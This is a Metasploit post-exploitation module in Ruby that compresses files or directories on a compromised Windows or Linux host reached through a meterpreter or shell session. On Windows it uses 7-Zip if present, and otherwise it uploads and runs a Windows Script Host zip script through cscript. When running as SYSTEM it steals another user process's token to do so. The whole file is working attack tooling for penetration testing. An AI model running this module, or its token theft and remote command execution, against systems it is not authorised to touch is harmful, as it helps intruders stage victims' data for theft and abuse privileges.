##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Multi Manage File Compressor',
        'Description'   => %q{
          This module zips a file or a directory. On Linux, it uses the zip command.
          On Windows, it will try to use remote target's 7Zip if found. If not, it falls
          back to its Windows Scripting Host.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'sinn3r' ],
        'Platform'      => [ 'win', 'linux' ],
        'SessionTypes'  => [ 'meterpreter', 'shell' ]
    ))

    register_options(
      [
        OptString.new('DESTINATION', [true, 'The destination path']),
        OptString.new('SOURCE', [true, 'The directory or file to compress'])
      ])
  end

  def get_program_file_path
    get_env('ProgramFiles')
  end

  def has_7zip?
    file?("#{get_program_file_path}\\7-Zip\\7z.exe")
  end

  def wsh_script(dst, src)
    script_file = File.read(File.join(Msf::Config.data_directory, "post", "zip", "zip.js"))
    src.gsub!("\\", "\\\\\\")
    dst.gsub!("\\", "\\\\\\")
    script_file << "zip(\"#{src}\",\"#{dst}\");".force_encoding("UTF-8")
    script_file
  end

  def find_pid_by_user(username)
    computer_name = get_env('COMPUTERNAME')
    print_status("Searching for PID for #{computer_name}\\\\#{username}")
    session.sys.process.processes.each do |p|
      if p['user'] == "#{computer_name}\\#{username}"
        return p['pid']
      end
    end

    nil
  end

  def steal_token
    current_user = get_env('USERNAME')
    pid = find_pid_by_user(current_user)

    unless pid
      fail_with(Failure::Unknown, "Unable to find a PID for #{current_user} to execute WSH")
    end

    print_status("Stealing token from PID #{pid} for #{current_user}")
    begin
      session.sys.config.steal_token(pid)
    rescue Rex::Post::Meterpreter::RequestError => e
      # It could raise an exception even when the token is successfully stolen,
      # so we will just log the exception and move on.
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    end

    @token_stolen = true
  end

  def upload_exec_wsh_script_zip
    if is_system?
      unless session
        print_error('Unable to compress with WSH technique without Meterpreter')
        return
      end

      steal_token
    end

    script = wsh_script(datastore['DESTINATION'], datastore['SOURCE'])
    tmp_path = "#{get_env('TEMP')}\\zip.js"
    print_status("script file uploaded to #{tmp_path}")
    write_file(tmp_path, script.encode("UTF-16LE"))
    cmd_exec("cscript.exe #{tmp_path}")
  end

  def do_7zip
    program_file_path = get_program_file_path
    output = cmd_exec("#{program_file_path}\\7-Zip\\7z.exe a -tzip \"#{datastore['DESTINATION']}\" \"#{datastore['SOURCE']}\"")
    vprint_line(output)
  end

  def do_zip
    output = cmd_exec("zip -D -q -r #{datastore['DESTINATION']} #{datastore['SOURCE']}")
    vprint_line(output)
  end

  def windows_zip
    if has_7zip?
      print_status("Compressing #{datastore['DESTINATION']} via 7zip")
      do_7zip
    else
      print_status("Compressing #{datastore['DESTINATION']} via WSH")
      upload_exec_wsh_script_zip
    end
  end

  def linux_zip
    print_status("Compressing #{datastore['DESTINATION']} via zip")
    do_zip
  end

  def cleanup
    if @token_stolen && session
      session.sys.config.revert_to_self
      print_status('Token restored.')
    end

    super
  end

  def run
    @token_stolen = false

    if session.platform == 'windows'
      windows_zip
    else
      linux_zip
    end
  end
end

